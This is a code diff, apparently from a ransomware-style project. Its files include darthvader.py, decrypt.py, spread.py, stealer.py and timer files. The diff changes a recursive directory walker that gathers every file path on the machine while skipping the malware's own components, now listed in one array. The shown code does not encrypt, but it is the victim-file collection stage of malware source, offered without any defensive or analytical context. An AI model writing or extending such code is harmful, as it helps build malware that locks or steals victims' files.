@@ -17,6 +17,7 @@ from datetime import datetime, timedelta # Import the datetime and timedelta
 files = [] # List to store the files in the current directory
 def recorrer_arbol_directorios(directory):
     global files
+    importantF=["darthvader.py", "decrypt.py", "logo.png", "spread.py", "time_remaining.txt", "window.py", "stealer.py", "auto_run", "encryption_time.txt","README.md","auto_run.cpp"]
     try:
         for file in os.listdir(directory):
             rute_element = os.path.join(directory, file)
@@ -29,7 +30,7 @@ def recorrer_arbol_directorios(directory):
                     recorrer_arbol_directorios(rute_element)
                 else:
                     # Ignora los archivos relacionados con Python
-                    if file.endswith('.py') or file == "darthvader.py" or file == "key.key" or file == "decrypt.py" or file == "encryption_time.txt":
+                    if file.endswith('.py') or file in importantF:
                         continue
                     print("File:", rute_element)
                     files.append(rute_element)
